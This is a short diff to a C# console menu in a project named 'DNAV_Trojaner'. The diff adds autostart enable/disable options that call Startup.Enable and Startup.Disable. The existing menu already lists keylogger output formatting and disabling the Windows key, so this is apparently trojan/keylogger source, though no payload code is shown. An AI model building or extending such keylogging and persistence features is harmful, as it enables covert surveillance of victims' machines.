@@ -22,6 +22,8 @@ namespace DNAV_Trojaner
                 Console.WriteLine("\t(8) Keylogger Output formatieren");
                 Console.WriteLine("\n\t(9) Windows Taste deaktivieren (Neustart erforderlich)");
                 Console.WriteLine("\t(10) Windows Taste aktivieren (Neustart erforderlich)");
+                Console.WriteLine("\n\t(11) Autostart aktivieren");
+                Console.WriteLine("\t(12) Autostart deaktivieren");
                 Console.WriteLine("\n\t(0) Exit");
                 Console.Write("\n\t> ");
                 input = Console.ReadLine();
@@ -71,6 +73,12 @@ namespace DNAV_Trojaner
                         break;
                     case "10":
                         WindowsKey.Enable();
+                        break;
+                    case "11":
+                        Startup.Enable();
+                        break;
+                    case "12":
+                        Startup.Disable();
                         break;
                 }
             } while (input != "0");
